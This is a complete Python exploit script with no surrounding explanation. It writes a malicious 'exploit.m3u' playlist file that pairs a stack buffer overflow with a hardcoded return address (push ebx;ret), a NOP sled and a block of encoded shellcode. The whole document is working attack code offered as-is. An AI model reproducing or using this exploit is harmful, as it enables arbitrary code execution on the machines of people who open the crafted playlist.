#!/bin/python
import struct

junk = "\x83\xc3\x78"*3+"\xff\xe3"+249*"\xcc"
#eip = struct.pack('<L', 0x7e487477) # jmp ebx
eip = struct.pack('<L', 0x7CA10666) # push ebx;ret

nop = 100*"\x90"
shellcode = ("\xb8\xb0\x63\xc3\xd4\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x30\x31\x43\x13\x03\x43\x13\x83\xc3\xb4\x81\x36\x28\x5c\xc7"
"\xb9\xd1\x9c\xa8\x30\x34\xad\xe8\x27\x3c\x9d\xd8\x2c\x10\x11"
"\x92\x61\x81\xa2\xd6\xad\xa6\x03\x5c\x88\x89\x94\xcd\xe8\x88"
"\x16\x0c\x3d\x6b\x27\xdf\x30\x6a\x60\x02\xb8\x3e\x39\x48\x6f"
"\xaf\x4e\x04\xac\x44\x1c\x88\xb4\xb9\xd4\xab\x95\x6f\x6f\xf2"
"\x35\x91\xbc\x8e\x7f\x89\xa1\xab\x36\x22\x11\x47\xc9\xe2\x68"
"\xa8\x66\xcb\x45\x5b\x76\x0b\x61\x84\x0d\x65\x92\x39\x16\xb2"
"\xe9\xe5\x93\x21\x49\x6d\x03\x8e\x68\xa2\xd2\x45\x66\x0f\x90"
"\x02\x6a\x8e\x75\x39\x96\x1b\x78\xee\x1f\x5f\x5f\x2a\x44\x3b"
"\xfe\x6b\x20\xea\xff\x6c\x8b\x53\x5a\xe6\x21\x87\xd7\xa5\x2f"
"\x56\x65\xd0\x1d\x58\x75\xdb\x31\x31\x44\x50\xde\x46\x59\xb3"
"\x9b\xb9\x13\x9e\x8d\x51\xfa\x4a\x8c\x3f\xfd\xa0\xd2\x39\x7e"
"\x41\xaa\xbd\x9e\x20\xaf\xfa\x18\xd8\xdd\x93\xcc\xde\x72\x93"
"\xc4\xbc\x15\x07\x84\x42")
payload = junk+eip+nop+shellcode

with open('exploit.m3u', 'w') as exploit:
    exploit.write(payload)